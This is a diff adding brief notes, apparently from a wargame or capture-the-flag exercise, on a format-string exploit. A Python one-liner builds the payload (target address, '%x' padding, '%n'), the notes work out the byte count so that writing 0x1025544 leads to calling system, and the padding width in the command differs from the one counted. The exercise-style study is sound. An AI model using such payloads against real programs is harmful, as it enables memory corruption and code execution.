@@ -1,0 +1,13 @@
+python -c "print '\x10\x98\x04\x08' + '%8x' * 10 + '%16930052x' + '%n'" > /tmp/ok2
+
+4 for \x10\x98\x04\x08
+
+80 for (%8x * 10)
+
+16930032 for '%16930032x'
+
+total: 16930116 = 0x1025544
+
+=> exec system
+
+Same as before really, except it is a bigger integer
